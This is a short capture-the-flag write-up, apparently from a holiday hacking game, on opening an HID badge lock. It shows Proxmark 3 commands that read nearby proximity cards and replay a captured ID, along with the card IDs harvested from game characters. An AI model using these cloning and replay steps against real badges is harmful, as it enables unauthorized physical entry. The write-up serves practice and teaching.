# Objective 5 - Open HID Lock
This challenge requires the collection of HID card signatures from the elves around the castle using a Proxmark 3. Once enough HID card signatures have been stolen via the Proxymark, one can be selected with the lowest ID value and thus most likely to be the most permissive. Once doing that, the door opens and the area is revealed.

## Collected Codes
Collected with the following command on the Proxmark 3 when in close proximity of an elf.
```bash
lf hid read
```
Noel Boetie
* #db# TAG ID: 2006e22ee1 (6000) - Format Len: 26 bit - FC: 113 - Card: 6000

Sparkle Redberry
* #db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022

Bow Ninecandle
* #db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023

Holly Evergreen
* #db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024

## Access
Broadcast the stolen HID code with the following command.
```bash
lf hid sim -r 2006e22ee1
```
![Secret Room Access](img/room.png)